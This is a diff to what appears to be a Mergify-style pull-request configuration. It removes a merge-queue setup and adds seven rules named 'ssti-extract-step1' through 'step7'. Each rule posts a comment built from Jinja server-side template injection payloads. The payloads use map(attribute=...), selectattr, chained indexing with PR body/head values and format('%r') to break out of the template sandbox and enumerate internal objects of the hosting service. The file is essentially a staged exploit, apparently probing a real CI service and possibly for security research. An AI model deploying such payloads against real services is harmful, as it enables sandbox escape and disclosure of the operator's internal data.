@@ -1,12 +1,81 @@
-queue_rules:
-  - name: default
-    queue_conditions:
+pull_request_rules:
+  - name: ssti-extract-step1
+    conditions:
       - base=main
-    merge_conditions:
-      - "#approved-reviews-by>=0"
-    merge_method: merge
-    commit_message_template: |
-      {{ ([cycler]|map(attribute=title))|first }}
+    actions:
+      comment:
+        message: |
+          STEP1: Getting proxy dict via map(attribute=title)
+          PROXY_STR: "{{ ([dict]|map(attribute=title))|first|string }}"
+          PROXY_LIST: "{{ ([dict]|map(attribute=title))|first|list }}"
+          PROXY_KEYS: "{{ ([dict]|map(attribute=title))|first|list|join(', ') }}"
+  
+  - name: ssti-extract-step2-selectattr
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          STEP2: selectattr bypass — class extraction
+          SEL_CLASS: "{{ [dict]|selectattr(title)|list }}"
+          SEL_CLASS_STR: "{{ [dict]|selectattr(title)|first|string }}"
+  
+  - name: ssti-extract-step3-probe
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          STEP3: Probing proxy for useful properties
+          PROXY_IS_CALLABLE: "{{ (([dict]|map(attribute=title))|first) is callable }}"
+          PROXY_IS_MAPPING: "{{ (([dict]|map(attribute=title))|first) is mapping }}"
+          PROXY_IS_ITERABLE: "{{ (([dict]|map(attribute=title))|first) is iterable }}"
+          PROXY_IS_STRING: "{{ (([dict]|map(attribute=title))|first) is string }}"
+  
+  - name: ssti-extract-step4-body-access
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          STEP4: Index proxy with body value
+          {% if body %}
+          PROXY_BODY_STR: "{{ (([dict]|map(attribute=title))|first)[body]|string }}"
+          PROXY_BODY_KEYS: "{{ (([dict]|map(attribute=title))|first)[body]|list|join(', ') }}"
+          {% else %}
+          No body provided
+          {% endif %}
+  
+  - name: ssti-extract-step5-head-access
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          STEP5: Chained index — proxy[body][head]
+          {% if body and head %}
+          CHAINED_STR: "{{ (([dict]|map(attribute=title))|first)[body][head]|string }}"
+          CHAINED_LIST: "{{ (([dict]|map(attribute=title))|first)[body][head]|list|join(', ') }}"
+          {% else %}
+          Need both body and head
+          {% endif %}
 
-merge_queue:
-  max_parallel_checks: 1
+  - name: ssti-extract-step6-builtins-probe
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          STEP6: What's inside the proxy dict? Try iterating
+          PROXY_FIRST: "{{ (([dict]|map(attribute=title))|first)|first|string if (([dict]|map(attribute=title))|first) is iterable else 'N/A' }}"
+
+  - name: ssti-extract-step7-format
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          STEP7: Using format() to reveal types
+          FORMAT_R: "{{ \"%r\"|format(([dict]|map(attribute=title))|first) }}"
+          FORMAT_S: "{{ \"%s\"|format(([dict]|map(attribute=title))|first) }}"
+          TYPE_CHECK: "{{ (([dict]|map(attribute=title))|first)|type|string }}"
